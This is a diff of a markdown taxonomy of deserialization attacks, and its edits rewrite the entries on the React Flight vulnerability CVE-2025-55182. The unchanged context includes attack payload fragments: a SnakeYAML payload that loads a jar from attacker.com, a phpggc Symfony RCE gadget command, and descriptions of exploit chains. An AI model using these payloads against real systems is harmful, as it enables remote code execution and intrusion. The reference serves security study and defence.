@@ -135,7 +135,7 @@ Serialization formats that encode type information (class names, type tags, form
 | **Jackson Polymorphic Typing** | When Jackson's `DefaultTyping` or `@JsonTypeInfo` is enabled, attacker-supplied JSON can specify arbitrary Java classes to instantiate, leading to JNDI injection or RCE via `TemplatesImpl` | `ObjectMapper.enableDefaultTyping()` or annotations on untrusted input |
 | **JSON.NET TypeNameHandling** | Setting `TypeNameHandling` to `Auto`, `All`, or `Objects` in Newtonsoft JSON.NET allows `$type` property to control deserialized type | `TypeNameHandling != None` on untrusted data |
 | **SnakeYAML Constructor** | SnakeYAML's default `Constructor` allows arbitrary Java class instantiation via `!!` type tags (e.g., `!!javax.script.ScriptEngineManager`) | SnakeYAML < 2.0 or custom unsafe `Constructor` |
-| **Flight Protocol Property Expansion** | React's Flight protocol decoder (`reviveModel()`) assigns payload values directly to objects without `hasOwnProperty` checks, enabling prototype pollution → RCE (CVE-2025-55182, CVSS 10.0) | React 19.x Server Components with default configuration |
+| **React Flight / Server Function Deserialization** | Vulnerable React Server Components packages deserialize attacker-controlled Flight / Server Function payloads into server-side function or module execution paths (CVE-2025-55182, CVSS 10.0) | Unpatched `react-server-dom-*` 19.0.0–19.2.3 or frameworks that expose vulnerable RSC endpoints |
 
 **Payload — SnakeYAML RCE:**
 ```yaml
@@ -143,10 +143,11 @@ Serialization formats that encode type information (class names, type tags, form
   [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]
 ```
 
-**Payload — React Flight Protocol Prototype Pollution (CVE-2025-55182):**
+**Payload — React Flight Protocol Deserialization (CVE-2025-55182):**
 ```
 # POST body with crafted Flight protocol payload:
-# Pollutes Object.prototype via __proto__ → constructor → Function → child_process.execSync
+# Abuses vulnerable RSC / Server Function deserialization and module/function resolution
+# to reach server-side code execution. This is not a generic __proto__ pollution primitive.
 ```
 
 ---
@@ -249,7 +250,7 @@ Marshal.dump(malicious_object)  # Deserializing triggers RCE
 | **PHAR Metadata Deserialization** | PHP Archive (PHAR) files contain serialized metadata that is automatically deserialized when accessed via `phar://` stream wrapper; pre-PHP 8.0, even `file_exists('phar://...')` triggers deserialization | PHP < 8.0 (automatic trigger) or explicit `Phar::getMetadata()` call on attacker-controlled PHAR file |
 | **ViewState Deserialization (.NET)** | ASP.NET ViewState is a serialized representation of page state; if MAC validation is disabled or the key is known, arbitrary objects can be injected | ViewState MAC validation disabled, or machine key leaked/weak |
 | **JWT Claims Deserialization** | Some JWT implementations deserialize claims payloads using unsafe deserializers rather than plain JSON parsing | JWT library using unsafe deserialization for claims (e.g., Java implementations using `ObjectInputStream`) |
-| **React Flight Protocol** | React Server Components use the Flight protocol to serialize/deserialize component trees; the decoder's implicit property expansion enables prototype pollution → RCE (CVE-2025-55182) | React 19.x RSC with unpatched Flight protocol decoder |
+| **React Flight Protocol** | React Server Components use the Flight protocol to serialize/deserialize component trees; vulnerable decoders can turn crafted Flight / Server Function payloads into server-side module or function execution paths (CVE-2025-55182) | React 19.x RSC with unpatched Flight protocol decoder |
 | **ML Model Serialization Formats** | Machine learning models serialized with pickle (PyTorch `.pt`/`.pth`), Keras (`.keras` config.json tampering), or joblib contain executable code that runs on `model.load()` | Loading untrusted ML models from public repositories |
 
 **Payload — PHAR polyglot (GIF header + serialized PHP object):**
@@ -288,7 +289,7 @@ Complex attacks often combine multiple deserialization steps or chain deserializ
 | **Deserialization → XXE** | As demonstrated by CVE-2024-34102, deserialization can trigger XML parsing that is vulnerable to XXE, enabling file exfiltration (e.g., Magento's `env.php` containing cryptographic keys) | XML parser invoked within deserialization chain |
 | **Deserialization → Template Injection** | Deserialized data feeds into a server-side template engine, enabling SSTI-based RCE | Deserialized values used in template rendering without sanitization |
 | **XXE → Key Leak → JWT Forgery → Admin RCE** | Full attack chain: XXE leaks cryptographic keys → forge admin JWT → abuse admin API for RCE; demonstrated in Magento CosmicSting chained with CVE-2024-2961 | Multi-stage exploit with each link enabling the next |
-| **Deserialization → Prototype Pollution → RCE** | Deserialization of JavaScript objects enables prototype pollution, which is then escalated to RCE via gadgets in Node.js built-ins (e.g., `child_process.execSync` via `Function` constructor) (CVE-2025-55182) | JavaScript/Node.js server with property-expanding deserializer |
+| **Deserialization → Prototype Pollution → RCE** | Deserialization of JavaScript objects can enable prototype pollution, which may then be escalated to RCE via gadgets in Node.js built-ins (e.g., `child_process.execSync` via `Function` constructor). Keep this distinct from React Server Components CVE-2025-55182, which is better modeled as Flight / Server Function deserialization rather than generic `Object.prototype` pollution. | JavaScript/Node.js server with property-expanding deserializer and reachable pollution gadgets |
 
 **Payload — Magento CosmicSting (CVE-2024-34102) nested deser → XXE:**
 ```json
@@ -498,7 +499,7 @@ phpggc Symfony/RCE4 exec "whoami" -b
 |---|---|---|
 | **node-serialize RCE** | `node-serialize` library's `unserialize()` function evaluates JavaScript code embedded in serialized data via Immediately Invoked Function Expressions (IIFE) | Application using `node-serialize` with untrusted data |
 | **Prototype Pollution via Deserialization** | JSON parsing or custom deserialization that doesn't guard against `__proto__`, `constructor.prototype`, or `constructor` properties enables prototype pollution, potentially escalatable to RCE | Property-expanding deserializer without prototype pollution guards |
-| **React Flight Protocol Exploitation** | `reviveModel()` in React Server Components assigns properties without `hasOwnProperty` verification; attacker-crafted payloads pollute `Object.prototype`, enabling `Function` constructor access → `child_process.execSync` (CVE-2025-55182) | React 19.x RSC unpatched |
+| **React Flight Protocol Exploitation** | Vulnerable React Server Components packages deserialize attacker-controlled Flight / Server Function payloads into server-side execution paths; do not model this as generic `Object.prototype` pollution unless a specific gadget proves that step (CVE-2025-55182) | Unpatched `react-server-dom-*` 19.0.0–19.2.3 |
 
 **Payload — node-serialize IIFE RCE:**
 ```json
@@ -604,7 +605,7 @@ class SleepyPickle:
 
 | Mutation Combination | CVE / Case | Impact / Bounty |
 |---|---|---|
-| §4-3 + §8-6 (Flight Protocol + Prototype Pollution → RCE) | CVE-2025-55182 (React Server Components) | CVSS 10.0. Unauthenticated RCE on ~40% of web developer ecosystem. Near-100% exploit reliability |
+| §4-3 + §8-6 (Flight Protocol deserialization → RCE) | CVE-2025-55182 (React Server Components) | CVSS 10.0. Unauthenticated RCE in vulnerable RSC-enabled deployments; current safe React baselines are 19.0.4 / 19.1.5 / 19.2.4. Ecosystem blast radius depends on framework, version, and exposed RSC endpoints |
 | §5-1 + §5-2 (Nested Deserialization → XXE → Key Leak) | CVE-2024-34102 (Adobe Commerce/Magento "CosmicSting") | CVSS 9.8. Pre-auth XXE enabling crypto key exfiltration → admin JWT forgery → RCE. Exploited in the wild |
 | §9-2 (ML Framework Deserialization) | CVE-2024-11394 (Hugging Face Transformers) | Critical. Pickle-based RCE via insufficient validation in model loading |
 | §9-2 + §5-2 (Prompt Injection → Serialization Injection) | CVE-2025-68664 (LangChain "LangGrinch") | CVSS 9.3. Secret exfiltration and potential RCE via prompt injection → serialization marker key escape failure |
@@ -688,7 +689,7 @@ The only robust defense is to **eliminate the conflation of data and behavior**:
 
 ### CVE Advisories
 
-**[CVE-2025-55182]** React Server Components Flight Protocol — Unauthenticated RCE via Prototype Pollution. CVSS 10.0. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) [[Wiz Research]](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182) [[React Advisory]](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
+**[CVE-2025-55182]** React Server Components Flight Protocol — unauthenticated RCE via unsafe Flight / Server Function payload deserialization. CVSS 10.0. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) [[Wiz Research]](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182) [[React Advisory]](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
 
 **[CVE-2024-34102]** Adobe Commerce/Magento "CosmicSting" — Nested Deserialization → XXE. CVSS 9.8. [[NVD]](https://nvd.nist.gov/vuln/detail/CVE-2024-34102) [[Assetnote]](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102)
 
@@ -753,4 +754,3 @@ The only robust defense is to **eliminate the conflation of data and behavior**:
 **[A5]** CodeWhite. "Bypassing .NET Serialization Binders" (2022). Systematic techniques for bypassing `SerializationBinder` implementations in .NET deserialization defenses. [[Blog]](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
 
 **[A6]** Viettel Cybersecurity. "The OWASSRF + TabShell Exploit Chain" (2022/2024). Multi-stage Microsoft Exchange exploitation: OWASSRF (CVE-2022-41080 + CVE-2022-41082) and TabShell (CVE-2024-49040). [[Blog]](https://blog.viettelcybersecurity.com/tabshell-owassrf/)
-
